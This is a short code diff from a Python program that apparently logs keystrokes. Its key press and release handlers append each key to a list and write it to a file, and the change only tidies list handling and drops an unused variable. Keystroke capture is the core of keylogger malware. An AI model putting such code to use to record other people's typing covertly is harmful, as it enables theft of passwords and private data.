@@ -86,15 +86,14 @@ def log():
         ks = str(key).strip("'")
         kl.append(ks)
         log_file(kl)
-        kl = []
+        kl.clear()
 
     def on_release(key):
-        onreleasekeys = ["Key.cmd", "Key.ctrl_l", "Key.ctrl_r", "Key.alt_gr", "Key.alt", "Key.delete"]
         klr = []
         ksr = str(key).strip("'")
         klr.append(ksr)
         log_file_release(klr)
-        klr = []
+        klr.clear()
 
     def log_file_release(klr):
         with open(fname, "a+") as f:
